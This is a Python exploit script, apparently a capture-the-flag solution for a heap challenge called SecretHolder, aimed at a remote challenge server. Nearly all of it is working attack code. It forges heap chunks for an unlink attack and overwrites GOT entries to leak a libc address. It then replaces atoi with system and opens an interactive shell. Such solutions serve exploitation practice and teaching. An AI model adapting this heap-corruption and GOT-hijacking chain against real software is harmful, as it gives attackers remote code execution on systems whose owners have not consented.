#!/usr/bin/env python2.7
# -*- coding:utf-8 -*-
from mkpwn import *
from time import sleep

# settings
local   = False
debug   = False

if local:
    target  = './SecretHolder_d6c0bed6d695edc12a9e7733bedde182554442f8'
else:
    target  = ('52.68.31.117', 5566)
    # target  = ('0', 8000)

# get io
io  = mk(target, debug)

# info
# 1. small secret   0x28 
# 2. big secret     0xfa0
# 3. huge secret    0x61a80

# global
big_note_adr    = 0x6020a0
huge_note_adr   = 0x6020a8
small_note_adr  = 0x6020b0
got_atoi        = 0x602070
got_free        = 0x602018
got_libc_s_main = 0x602048
plt_puts        = 0x4006c0
offset_atoi     = 0x036e70
offset_system   = 0x045380

# exp

val = lambda x: str(x).rjust(0x3, '0')

def exp():
    # malloc huge; free huge
    io.ru('3. Renew secret')
    io.pr(0x1, 0x3, 'C' * 0x100)
    io.ru('3. Renew secret')
    io.pr(0x2, 0x3)
    #sleep(2)

    # malloc small; malloc big
    io.ru('3. Renew secret')
    io.pr(0x1, 0x1, 'A' * 0x20)
    #sleep(2)
    io.ru('3. Renew secret')
    io.pr(0x1, 0x2, 'B' * 0x80)

    # free small; free big
    io.ru('3. Renew secret')
    io.pr(0x2, 0x1)
    io.ru('3. Renew secret')
    io.pr(0x2, 0x2)

    # malloc huge
    # chunk 0 (unlinked)
    payload  = l64(0x0) + l64(0x30) + l64(huge_note_adr - 0x8 * 3) + l64(huge_note_adr - 0x8 * 2)
    # chunk 1 (free'd)
    payload += l64(0x20) + l64(0xa0)
    payload += 'A' * 0x90
    # chunk 2
    payload += l64(0x0) + l64(0xa1) 
    payload += 'A' * 0x90
    # chunk 3 (pre_inuse should be set 0x1 to make sure chunk 2 is not free, so that chunk 2 wont be unlinked)
    payload += l64(0x0) + l64(0xa1)
    io.ru('3. Renew secret')
    io.pr(0x1, 0x3)
    io.ru('Tell me your secret:')
    io.pr(payload)
    
    # free big => unlink
    io.ru('3. Renew secret')
    io.pr(0x2, 0x2)

    # overwrite ptr @.bss
    payload  = 'A' * 0x10
    payload += l64(got_atoi) + l64(got_free) + l64(got_atoi) + l32(0x1) * 3
    io.ru('3. Renew secret')
    io.pr(0x3, 0x3)
    io.ru('Tell me your secret:')
    io.pr(payload)

    # overwrite free@got 
    io.ru('3. Renew secret')
    io.pr(0x3, 0x3)
    io.ru('Tell me your secret:')
    io.pr(l64(plt_puts) + l64(plt_puts + 0x6))

    # call printf to leak
    io.ru('3. Renew secret')
    io.pr(0x2, 0x2)

    # get libc info
    io.ru('3. Huge secret\n')
    libc_atoi   = l64(io.rl()[:-1].ljust(0x8, '\x00'))
    libc_system = libc_atoi + offset_system - offset_atoi
    info_found('libc atoi', libc_atoi)
    info_found('libc system', libc_system)
     
    # overwrite atoi @got to address of system 
    io.pr(0x3, 0x1)
    io.ru('Tell me your secret:')
    io.pr(l64(libc_system))

    # send 'sh' to system
    io.pr('sh\x00')

    info_shell()
    io.interact()

# main
if __name__ == '__main__':
    exp()
